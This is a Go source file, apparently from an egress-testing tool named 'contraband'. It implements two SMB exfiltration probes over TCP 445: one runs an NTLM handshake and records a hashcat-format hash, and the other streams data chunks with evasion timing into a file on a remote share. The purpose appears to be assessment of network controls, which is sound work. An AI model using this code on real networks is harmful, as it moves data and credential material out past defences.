package smb

import (
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strconv"
	"time"

	"github.com/shehzade/contraband/pkg/client/evasion"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

func init() {
	exfil.RegisterExfiltrator(common.ProtoSMBFile, NewSMBTCPFileExfiltrator())
	exfil.RegisterExfiltrator(common.ProtoSMBHash, NewSMBTCPHashExfiltrator())
}

func ClassifySMBError(err error) common.Verdict {
	return common.ClassifyError(err)
}

func calculateDurations(r *common.ProbeResult) {
	if r.Timestamps.TeardownDone.IsZero() {
		r.Timestamps.TeardownDone = time.Now().UTC()
	}
	r.Timestamps.ComputeDurations()
	if r.Timestamps.TransferDuration > 0 && r.BytesSent > 0 {
		r.ThroughputBps = float64(r.BytesSent*8) / (float64(r.Timestamps.TransferDuration) / float64(time.Second)) / 1000.0
	}
}

// SMBTCPHashExfiltrator tests if outbound SMB TCP 445 leaks credentials via NTLM handshake.
type SMBTCPHashExfiltrator struct{}

func NewSMBTCPHashExfiltrator() *SMBTCPHashExfiltrator {
	return &SMBTCPHashExfiltrator{}
}

func (e *SMBTCPHashExfiltrator) Protocol() string {
	return common.ProtoSMBHash
}

func (e *SMBTCPHashExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	targetAddr := net.JoinHostPort(opts.TargetHost, strconv.Itoa(opts.TargetPort))
	d := net.Dialer{Timeout: opts.Timeout}
	conn, dialErr := d.DialContext(ctx, "tcp", targetAddr)
	if dialErr != nil {
		result.Verdict = ClassifySMBError(dialErr)
		result.ErrorMessage = dialErr.Error()
		calculateDurations(&result)
		return &result, dialErr
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(opts.Timeout))

	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.FirstByteSent = time.Now().UTC()

	username := opts.Headers["username"]
	if username == "" {
		username = "contraband"
	}
	password := opts.Headers["password"]
	if password == "" {
		password = "ContrabandPassword123!"
	}
	domain := opts.Headers["domain"]
	if domain == "" {
		domain = "CONTRABAND"
	}

	var msgID uint64 = 0

	// Step 1: Send SMB2 Negotiate Request
	negPkt := BuildSMB2NegotiateRequest(msgID)
	msgID++
	if _, err := conn.Write(PackNetBIOS(negPkt)); err != nil {
		result.Verdict = ClassifySMBError(err)
		result.ErrorMessage = fmt.Sprintf("failed to send SMB2 Negotiate: %v", err)
		calculateDurations(&result)
		return &result, err
	}
	result.BytesSent += int64(len(negPkt) + 4)

	negRespRaw, err := ReadNetBIOSMessage(conn)
	if err != nil {
		result.Verdict = ClassifySMBError(err)
		result.ErrorMessage = fmt.Sprintf("failed to read SMB2 Negotiate response: %v", err)
		calculateDurations(&result)
		return &result, err
	}
	result.BytesRecv += int64(len(negRespRaw) + 4)
	if len(negRespRaw) < 64 {
		err := fmt.Errorf("SMB2 Negotiate response truncated: %d bytes", len(negRespRaw))
		result.Verdict = common.VerdictBlockedL7
		result.ErrorMessage = err.Error()
		calculateDurations(&result)
		return &result, err
	}

	// Step 2: Send SMB2 Session Setup Request containing NTLMSSP Type 1
	type1Bytes := BuildNTLMSSPType1()
	setup1Pkt := BuildSMB2SessionSetupRequest(msgID, 0, type1Bytes)
	msgID++
	if _, err := conn.Write(PackNetBIOS(setup1Pkt)); err != nil {
		result.Verdict = ClassifySMBError(err)
		result.ErrorMessage = fmt.Sprintf("failed to send SMB2 Session Setup Type 1: %v", err)
		calculateDurations(&result)
		return &result, err
	}
	result.BytesSent += int64(len(setup1Pkt) + 4)

	setup1RespRaw, err := ReadNetBIOSMessage(conn)
	if err != nil {
		result.Verdict = ClassifySMBError(err)
		result.ErrorMessage = fmt.Sprintf("failed to read SMB2 Session Setup Type 2 response: %v", err)
		calculateDurations(&result)
		return &result, err
	}
	result.BytesRecv += int64(len(setup1RespRaw) + 4)

	setup1Hdr, err := DecodeSMB2Header(setup1RespRaw)
	if err != nil {
		result.Verdict = common.VerdictBlockedL7
		result.ErrorMessage = fmt.Sprintf("invalid SMB2 header in Type 2 response: %v", err)
		calculateDurations(&result)
		return &result, err
	}

	sessionID := setup1Hdr.SessionID
	// Extract NTLMSSP Type 2 from Session Setup body
	// Response body structure size is 9, security buffer offset at body[4:6], length at body[6:8]
	if len(setup1RespRaw) < 64+9 {
		err := fmt.Errorf("SMB2 Session Setup Type 2 response body truncated")
		result.Verdict = common.VerdictBlockedL7
		result.ErrorMessage = err.Error()
		calculateDurations(&result)
		return &result, err
	}
	secBufOffset := binary.LittleEndian.Uint16(setup1RespRaw[64+4 : 64+6])
	secBufLen := binary.LittleEndian.Uint16(setup1RespRaw[64+6 : 64+8])
	if int(secBufOffset+secBufLen) > len(setup1RespRaw) {
		err := fmt.Errorf("invalid security buffer offset/length in Type 2 response")
		result.Verdict = common.VerdictBlockedL7
		result.ErrorMessage = err.Error()
		calculateDurations(&result)
		return &result, err
	}
	type2Bytes := setup1RespRaw[secBufOffset : secBufOffset+secBufLen]
	challenge, srvTarget, err := ParseNTLMSSPType2Challenge(type2Bytes)
	if err != nil {
		result.Verdict = common.VerdictBlockedL7
		result.ErrorMessage = fmt.Sprintf("failed to parse NTLMSSP Type 2 challenge: %v", err)
		calculateDurations(&result)
		return &result, err
	}
	if srvTarget != "" && domain == "CONTRABAND" {
		domain = srvTarget
	}

	// Step 3: Send SMB2 Session Setup Request containing NTLMSSP Type 3
	type3Bytes := BuildNTLMSSPType3(username, domain, password, challenge)
	setup2Pkt := BuildSMB2SessionSetupRequest(msgID, sessionID, type3Bytes)
	msgID++
	if _, err := conn.Write(PackNetBIOS(setup2Pkt)); err != nil {
		result.Verdict = ClassifySMBError(err)
		result.ErrorMessage = fmt.Sprintf("failed to send SMB2 Session Setup Type 3: %v", err)
		calculateDurations(&result)
		return &result, err
	}
	result.BytesSent += int64(len(setup2Pkt) + 4)

	setup2RespRaw, err := ReadNetBIOSMessage(conn)
	if err != nil {
		result.Verdict = ClassifySMBError(err)
		result.ErrorMessage = fmt.Sprintf("failed to read SMB2 Session Setup Type 3 response: %v", err)
		calculateDurations(&result)
		return &result, err
	}
	result.BytesRecv += int64(len(setup2RespRaw) + 4)

	// Format hashcat representation for assessment record
	_, _, hashcatStr, _, _ := ParseNTLMSSPType3(type3Bytes, challenge)
	result.CapturedHash = hashcatStr
	result.RawEvidence = common.FormatBoundedRawEvidence([]byte(hashcatStr))

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	calculateDurations(&result)

	return &result, nil
}

// SMBTCPFileExfiltrator streams file chunk frames with 32-byte ChunkHeader over SMB TCP 445.
type SMBTCPFileExfiltrator struct{}

func NewSMBTCPFileExfiltrator() *SMBTCPFileExfiltrator {
	return &SMBTCPFileExfiltrator{}
}

func (e *SMBTCPFileExfiltrator) Protocol() string {
	return common.ProtoSMBFile
}

func (e *SMBTCPFileExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	chunker, err := evasion.NewStreamChunker(reader, opts.SessionToken, opts.ChunkSize, opts.TotalBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize chunk streamer: %w", err)
	}
	defer chunker.Close()

	targetAddr := net.JoinHostPort(opts.TargetHost, strconv.Itoa(opts.TargetPort))
	d := net.Dialer{Timeout: opts.Timeout}
	conn, dialErr := d.DialContext(ctx, "tcp", targetAddr)
	if dialErr != nil {
		result.Verdict = ClassifySMBError(dialErr)
		result.ErrorMessage = dialErr.Error()
		calculateDurations(&result)
		return &result, dialErr
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(opts.Timeout))

	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.FirstByteSent = time.Now().UTC()

	var msgID uint64 = 0

	// Step 1: Negotiate
	negPkt := BuildSMB2NegotiateRequest(msgID)
	msgID++
	if _, err := conn.Write(PackNetBIOS(negPkt)); err != nil {
		result.Verdict = ClassifySMBError(err)
		result.ErrorMessage = fmt.Sprintf("failed to send SMB2 Negotiate: %v", err)
		calculateDurations(&result)
		return &result, err
	}
	result.BytesSent += int64(len(negPkt) + 4)

	negRespRaw, err := ReadNetBIOSMessage(conn)
	if err != nil {
		result.Verdict = ClassifySMBError(err)
		result.ErrorMessage = fmt.Sprintf("failed to read SMB2 Negotiate response: %v", err)
		calculateDurations(&result)
		return &result, err
	}
	result.BytesRecv += int64(len(negRespRaw) + 4)

	// Step 2: Anonymous Session Setup or Type 1
	username := opts.Headers["username"]
	password := opts.Headers["password"]
	domain := opts.Headers["domain"]
	if domain == "" {
		domain = "WORKGROUP"
	}

	var sessionID uint64 = 0
	if username != "" && password != "" {
		// NTLMSSP authentication
		type1Bytes := BuildNTLMSSPType1()
		setup1Pkt := BuildSMB2SessionSetupRequest(msgID, 0, type1Bytes)
		msgID++
		if _, err := conn.Write(PackNetBIOS(setup1Pkt)); err != nil {
			result.Verdict = ClassifySMBError(err)
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}
		result.BytesSent += int64(len(setup1Pkt) + 4)

		setup1RespRaw, err := ReadNetBIOSMessage(conn)
		if err != nil {
			result.Verdict = ClassifySMBError(err)
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}
		result.BytesRecv += int64(len(setup1RespRaw) + 4)

		s1Hdr, err := DecodeSMB2Header(setup1RespRaw)
		if err != nil {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}
		sessionID = s1Hdr.SessionID

		secBufOffset := binary.LittleEndian.Uint16(setup1RespRaw[64+4 : 64+6])
		secBufLen := binary.LittleEndian.Uint16(setup1RespRaw[64+6 : 64+8])
		type2Bytes := setup1RespRaw[secBufOffset : secBufOffset+secBufLen]
		challenge, _, err := ParseNTLMSSPType2Challenge(type2Bytes)
		if err != nil {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}

		type3Bytes := BuildNTLMSSPType3(username, domain, password, challenge)
		setup2Pkt := BuildSMB2SessionSetupRequest(msgID, sessionID, type3Bytes)
		msgID++
		if _, err := conn.Write(PackNetBIOS(setup2Pkt)); err != nil {
			result.Verdict = ClassifySMBError(err)
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}
		result.BytesSent += int64(len(setup2Pkt) + 4)

		setup2RespRaw, err := ReadNetBIOSMessage(conn)
		if err != nil {
			result.Verdict = ClassifySMBError(err)
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}
		result.BytesRecv += int64(len(setup2RespRaw) + 4)

		s2Hdr, _ := DecodeSMB2Header(setup2RespRaw)
		if s2Hdr != nil && s2Hdr.Status != 0 {
			err := fmt.Errorf("SMB2 Session Setup failed with status 0x%08X", s2Hdr.Status)
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}
	} else {
		// Anonymous setup
		setupPkt := BuildSMB2SessionSetupRequest(msgID, 0, nil)
		msgID++
		if _, err := conn.Write(PackNetBIOS(setupPkt)); err != nil {
			result.Verdict = ClassifySMBError(err)
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}
		result.BytesSent += int64(len(setupPkt) + 4)

		setupRespRaw, err := ReadNetBIOSMessage(conn)
		if err != nil {
			result.Verdict = ClassifySMBError(err)
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}
		result.BytesRecv += int64(len(setupRespRaw) + 4)

		sHdr, err := DecodeSMB2Header(setupRespRaw)
		if err != nil {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}
		sessionID = sHdr.SessionID
	}

	// Step 3: Tree Connect
	sharePath := opts.Headers["share"]
	if sharePath == "" {
		sharePath = fmt.Sprintf("\\\\%s\\share", opts.TargetHost)
	}
	treePkt := BuildSMB2TreeConnectRequest(msgID, sessionID, sharePath)
	msgID++
	if _, err := conn.Write(PackNetBIOS(treePkt)); err != nil {
		result.Verdict = ClassifySMBError(err)
		result.ErrorMessage = err.Error()
		calculateDurations(&result)
		return &result, err
	}
	result.BytesSent += int64(len(treePkt) + 4)

	treeRespRaw, err := ReadNetBIOSMessage(conn)
	if err != nil {
		result.Verdict = ClassifySMBError(err)
		result.ErrorMessage = err.Error()
		calculateDurations(&result)
		return &result, err
	}
	result.BytesRecv += int64(len(treeRespRaw) + 4)

	treeHdr, err := DecodeSMB2Header(treeRespRaw)
	if err != nil {
		result.Verdict = common.VerdictBlockedL7
		result.ErrorMessage = err.Error()
		calculateDurations(&result)
		return &result, err
	}
	treeID := treeHdr.TreeID

	// Step 4: Create File
	fileName := fmt.Sprintf("contraband_%s.dat", opts.SessionToken.String())
	createPkt := BuildSMB2CreateRequest(msgID, sessionID, treeID, fileName)
	msgID++
	if _, err := conn.Write(PackNetBIOS(createPkt)); err != nil {
		result.Verdict = ClassifySMBError(err)
		result.ErrorMessage = err.Error()
		calculateDurations(&result)
		return &result, err
	}
	result.BytesSent += int64(len(createPkt) + 4)

	createRespRaw, err := ReadNetBIOSMessage(conn)
	if err != nil {
		result.Verdict = ClassifySMBError(err)
		result.ErrorMessage = err.Error()
		calculateDurations(&result)
		return &result, err
	}
	result.BytesRecv += int64(len(createRespRaw) + 4)

	var fileID [16]byte
	if len(createRespRaw) >= 64+88 {
		copy(fileID[:], createRespRaw[64+64:64+80])
	}

	// Step 5: Write Chunks sequentially
	var fileOffset uint64 = 0
	var headEvidence []byte
	for {
		chunkFrame, _, err := chunker.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			result.Verdict = ClassifySMBError(err)
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}

		if len(headEvidence) < 1024 {
			take := 1024 - len(headEvidence)
			if take > len(chunkFrame) {
				take = len(chunkFrame)
			}
			headEvidence = append(headEvidence, chunkFrame[:take]...)
		}

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
				result.Verdict = ClassifySMBError(err)
				result.ErrorMessage = err.Error()
				calculateDurations(&result)
				return &result, err
			}
		}
		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = ClassifySMBError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					calculateDurations(&result)
					return &result, ctx.Err()
				}
			}
		}

		writePkt := BuildSMB2WriteRequest(msgID, sessionID, treeID, fileID, fileOffset, chunkFrame)
		msgID++
		if _, err := conn.Write(PackNetBIOS(writePkt)); err != nil {
			result.Verdict = ClassifySMBError(err)
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}
		result.BytesSent += int64(len(writePkt) + 4)
		fileOffset += uint64(len(chunkFrame))

		writeRespRaw, err := ReadNetBIOSMessage(conn)
		if err != nil {
			result.Verdict = ClassifySMBError(err)
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}
		result.BytesRecv += int64(len(writeRespRaw) + 4)
	}

	// Step 6: Close File
	closePkt := BuildSMB2CloseRequest(msgID, sessionID, treeID, fileID)
	msgID++
	_, _ = conn.Write(PackNetBIOS(closePkt))
	closeRespRaw, _ := ReadNetBIOSMessage(conn)
	result.BytesRecv += int64(len(closeRespRaw) + 4)

	// Step 7: Tree Disconnect
	discPkt := BuildSMB2TreeDisconnectRequest(msgID, sessionID, treeID)
	_, _ = conn.Write(PackNetBIOS(discPkt))

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	if opts.ExpectedHash != "" {
		result.PayloadHash = opts.ExpectedHash
	} else {
		result.PayloadHash = chunker.PayloadHashHex()
	}
	result.TargetVolume = result.BytesSent
	result.RawEvidence = common.FormatBoundedRawEvidence(headEvidence)
	calculateDurations(&result)

	return &result, nil
}
